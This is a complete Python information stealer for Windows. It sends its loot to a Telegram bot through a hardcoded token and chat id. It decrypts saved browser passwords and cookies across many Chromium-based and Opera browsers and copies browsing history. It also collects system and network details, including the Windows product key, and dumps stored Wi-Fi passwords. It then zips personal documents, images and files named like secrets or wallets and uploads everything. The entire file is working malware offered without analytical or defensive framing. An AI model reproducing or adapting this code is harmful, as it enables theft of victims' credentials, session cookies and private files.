import os
import winreg
import shutil
import subprocess
import zipfile
import requests
import re
import time
import ctypes
import sys
import psutil
import pycountry
from screeninfo import get_monitors
from typing import Optional, Union
import base64
import json
import random
import sqlite3
import threading
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import winshell
from win32com.client import Dispatch
import winreg as reg
import win32crypt

bot_token = '7481960829:AAFWLAti2xagba2MyBWDHBTChsR3__Ks2gM'
chat_id = '-1002159253602'

class BrowserDataCollector:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]
        self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
        os.makedirs(os.path.join(self.temp_path, "Browser"), exist_ok=True)

        def process_browser(name, path, profile, func):
            try:
                func(name, path, profile)
            except Exception:
                pass

        threads = []
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')

            self.funcs = [self.extract_passwords, self.extract_history, self.cookies]

            for profile in self.profiles:
                for func in self.funcs:
                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()

        self.create_zip_and_send()

    def get_master_key(self, path: str) -> bytes:
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = encrypted_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            return b''

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception:
            return ""

    def extract_passwords(self, name: str, path: str, profile: str):
        user_data_path = os.path.join(path, profile, 'Login Data')
        if not os.path.isfile(user_data_path):
            return
        
        temp_db_path = self.create_temp()
        shutil.copy2(user_data_path, temp_db_path)
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        
        passwords = []
        for row in cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins"):
            origin_url, action_url, username, encrypted_password = row
            decrypted_password = self.decrypt_password(encrypted_password, self.masterkey)
            if username or decrypted_password:
                passwords.append({
                    'browser': name,
                    'profile': profile,
                    'origin_url': origin_url,
                    'action_url': action_url,
                    'username': username,
                    'password': decrypted_password
                })

        cursor.close()
        conn.close()
        os.remove(temp_db_path)
        
        if passwords:
            filename = os.path.join(self.temp_path, "Browser", f"{name}_{profile}_passwords.txt")
            self.save_data_to_file(passwords, filename)

    def extract_history(self, name: str, path: str, profile: str):
        history_db_path = os.path.join(path, profile, 'History')
        if not os.path.isfile(history_db_path):
            return

        temp_db_path = self.create_temp()
        shutil.copy2(history_db_path, temp_db_path)
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        
        rows = cursor.execute("SELECT url, title, visit_count FROM urls").fetchall()
        if rows:
            filename = os.path.join(self.temp_path, "Browser", f"{name}_{profile}_history.txt")
            with open(filename, "w", encoding="utf-8") as f:
                for row in rows:
                    f.write(f"URL: {row[0]}\nTitle: {row[1]}\nVisit Count: {row[2]}\n\n")

        cursor.close()
        conn.close()
        os.remove(temp_db_path)

    def cookies(self, name: str, path: str, profile: str):
        if name in ['opera', 'opera-gx']:
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return

        temp_db_path = self.create_temp()
        shutil.copy2(path, temp_db_path)
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        
        with open(os.path.join(self.temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value:
                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        
        cursor.close()
        conn.close()
        os.remove(temp_db_path)

    def save_data_to_file(self, data, filename):
        with open(filename, 'w', encoding='utf-8') as file:
            grouped_data = {}
            for entry in data:
                browser = entry['browser']
                profile = entry['profile']
                if browser not in grouped_data:
                    grouped_data[browser] = {}
                if profile not in grouped_data[browser]:
                    grouped_data[browser][profile] = []

                grouped_data[browser][profile].append(entry)

            for browser, profiles in grouped_data.items():
                for profile, entries in profiles.items():
                    file.write(f"Browser: {browser} | Profile: {profile}\n")
                    file.write(f"{'Website':<80} | {'Username':<30} | {'Password':<30}\n")
                    file.write("=" * 140 + "\n")

                    for entry in entries:
                        website = entry['origin_url']
                        username = entry.get('username', 'N/A')
                        password = entry.get('password', 'N/A')
                        file.write(f"{website:<80} | {username:<30} | {password:<30}\n")

                    file.write("=" * 140 + "\n")

    def create_zip(self, file_paths: list, zip_path: str):
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for file in file_paths:
                if os.path.isfile(file):
                    zipf.write(file, os.path.basename(file))

    def create_zip_and_send(self):
        file_paths = [
            os.path.join(self.temp_path, "Browser", "cookies.txt"),
            *[os.path.join(self.temp_path, "Browser", f) for f in os.listdir(os.path.join(self.temp_path, "Browser")) if f.endswith('_passwords.txt') or f.endswith('_history.txt')]
        ]
        zip_file_path = os.path.join(self.temp_path, "BrowserData.zip")
        self.create_zip(file_paths, zip_file_path)
        self.send_file_to_telegram(zip_file_path)

        for file in file_paths:
            if os.path.isfile(file):
                os.remove(file)
        if os.path.isfile(zip_file_path):
            os.remove(zip_file_path)

    def send_file_to_telegram(self, file_path: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        with open(file_path, 'rb') as file:
            response = requests.post(
                url,
                files={'document': file},
                data={'chat_id': chat_id}
            )
        if response.status_code == 200:
            print("File sent successfully!")
        else:
            print("Failed to send file:", response.text)
        return response

    def create_temp(self) -> str:
        if not os.path.exists(self.temp_path):
            os.makedirs(self.temp_path)
        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = os.path.join(self.temp_path, file_name)
        open(path, "x").close()
        return path

class PcInfo:
    def __init__(self):
        self.username = "RSPVN"
        self.get_system_info()

    def get_country_code(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return str(country.alpha_2).lower()
        except LookupError:
            return "white"

    def get_all_avs(self) -> str:
        process = subprocess.run(
            "WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName",
            shell=True, capture_output=True
        )
        if process.returncode == 0:
            output = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n").splitlines()
            if len(output) >= 2:
                output = output[1:]
                output = [av.strip() for av in output]
                return ", ".join(output)

    def get_screen_resolution(self):
        monitors = get_monitors()
        resolutions = [f"{monitor.width}x{monitor.height}" for monitor in monitors]
        return ', '.join(resolutions)

    def get_system_info(self):
        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
        ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
        model = subprocess.run('wmic computersystem get model', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() if subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() != "" else "Failed to get product key"

        try:
            r: dict = requests.get("http://ip-api.com/json/?fields=225545").json()
            if r["status"] != "success":
                raise Exception("Failed")
            country = r["country"]
            proxy = r["proxy"]
            ip = r["query"]
        except Exception:
            country = "Failed to get country"
            proxy = "Failed to get proxy"
            ip = "Failed to get IP"
                  
        _, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address

        screen_resolution = self.get_screen_resolution()

        message = f'''
**PC Username:** `{username}`
**PC Name:** `{hostname}`
**Model:** `{model if model else "Unknown"}`
**Screen Resolution:** `{screen_resolution}`
**OS:** `{computer_os}`
**Product Key:** `{product_key}`\n
**IP:** `{ip}`
**Country:** `{country}`
**Proxy:** `{proxy}` if proxy else "None"
**MAC:** `{mac}`
**UUID:** `{uuid}`\n
**CPU:** `{cpu}`
**GPU:** `{gpu}`
**RAM:** `{ram}GB`\n
**Antivirus:** `{self.get_all_avs()}`
        '''

        self.send_message_to_telegram(message)

    def send_message_to_telegram(self, message: str):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        response = requests.post(
            url,
            data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
        )
        return response

class Wifi:
    def __init__(self):
        self.networks = {}
        self.get_networks()
        self.send_info_to_telegram()

    def run_command(self, command, encoding='utf-8'):
        try:
            result = subprocess.run(command, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return result.stdout.strip()
        except subprocess.CalledProcessError as e:
            return f"Error: {e}"

    def get_networks(self):
        output_networks = self.run_command(["netsh", "wlan", "show", "profiles"])
        profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profile" in line]
        
        for profile in profiles:
            if profile:
                profile_info = self.run_command(["netsh", "wlan", "show", "profile", profile, "key=clear"])
                self.networks[profile] = self.extract_password(profile_info)

    def extract_password(self, profile_info):
        match = re.search(r"Key Content\s*:\s*(.+)", profile_info)
        return match.group(1).strip() if match else "No password found"

    def get_router_ip(self):
        output = self.run_command("ipconfig")
        router_ip = None
        is_wifi = False
        for line in output.splitlines():
            if "Wireless Network Connection" in line or "Wireless LAN adapter" in line:
                is_wifi = True
            elif is_wifi and "Default Gateway" in line:
                router_ip = line.split(":")[1].strip()
                break
        return router_ip if router_ip else "Failed to get router IP"

    def get_mac_address(self):
        router_ip = self.get_router_ip()
        if router_ip == "Failed to get router IP":
            return "Failed to get MAC address"
        self.run_command(f"ping -n 1 {router_ip}") 
        output = self.run_command(f"arp -a {router_ip}")
        mac_address_match = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", output)
        return mac_address_match.group() if mac_address_match else "MAC address not found"

    def get_vendor_info(self, mac_address):
        try:
            url = f"https://api.macvendors.com/{mac_address}"
            response = requests.get(url)
            return response.text if response.status_code == 200 else "Vendor info not found"
        except requests.RequestException as e:
            return f"Error: {e}"

    def send_info_to_telegram(self):
        router_ip = self.get_router_ip()
        mac_address = self.get_mac_address()
        vendor_info = self.get_vendor_info(mac_address)
        
        message = f'''
**Router IP Address:** `{router_ip}`
**Router MAC Address:** `{mac_address}`
**Router Vendor:** `{vendor_info}`
**Saved Wi-Fi Networks:**
'''
        if self.networks:
            for network, password in self.networks.items():
                message += f"- `{network}`: `{password}`\n"
        else:
            message += "No Wi-Fi networks found."

        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        response = requests.post(
            url,
            data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
        )
        return response
    

temp_path = os.path.join(os.getenv('TEMP', '/tmp'), f'Common-Files-{os.getlogin()}')


def is_connected():
    try:
        requests.get('https://www.google.com', timeout=5)
        return True
    except requests.ConnectionError:
        return False

def wait_for_network():
    if not is_connected():
        sys.exit()  


class CommonFiles:
    def __init__(self):
        self.zipfile = os.path.join(temp_path, 'Common-Files.zip')
        self.steal_common_files()
        self.create_zip()
        self.send_to_telegram()

    def steal_common_files(self) -> None:
        def _get_user_folder_path(folder_name):
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders") as key:
                    value, _ = winreg.QueryValueEx(key, folder_name)
                    return value
            except FileNotFoundError:
                return None

        personal_folders = [
            "Desktop", "Personal", "Downloads", "My Pictures", "My Music", "My Videos", "Documents"
        ]
        
        paths = [ _get_user_folder_path(folder) for folder in personal_folders ]

        if not os.path.exists(temp_path):
            os.makedirs(temp_path)

        self.files_to_zip = []

        for search_path in paths:
            if search_path and os.path.isdir(search_path):
                self._process_directory(search_path)

    def _process_directory(self, directory):
        try:
            for entry in os.listdir(directory):
                full_path = os.path.join(directory, entry)
                if os.path.isfile(full_path):
                    if (any(x in entry.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")) 
                        or entry.endswith((".txt", ".rtf", ".odt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".ods", ".json", ".ppk", ".jpg", ".jpeg", ".png", ".gif"))) \
                        and not entry.endswith(".lnk") \
                        and 0 < os.path.getsize(full_path) < 48 * 1024 * 1024: 
                        self.files_to_zip.append(full_path)
                elif os.path.isdir(full_path):
                    self._process_directory(full_path)
        except PermissionError:
            pass

    def create_zip(self):
        with zipfile.ZipFile(self.zipfile, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in self.files_to_zip:
                zipf.write(file, os.path.basename(file))

    def send_to_telegram(self):
        try:
            with open(self.zipfile, 'rb') as file:
                files = {'document': file}
                url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                payload = {'chat_id': chat_id}
                response = requests.post(url, files=files, data=payload)
                response.raise_for_status()
        except requests.RequestException as e:
            print(f'Failed to send file to Telegram: {e}')
        except FileNotFoundError:
            print(f'File {self.zipfile} not found.')


def main():
    wait_for_network()   
    BrowserDataCollector()  
    PcInfo()      
    Wifi()   
    CommonFiles()
if __name__ == "__main__":
    main()
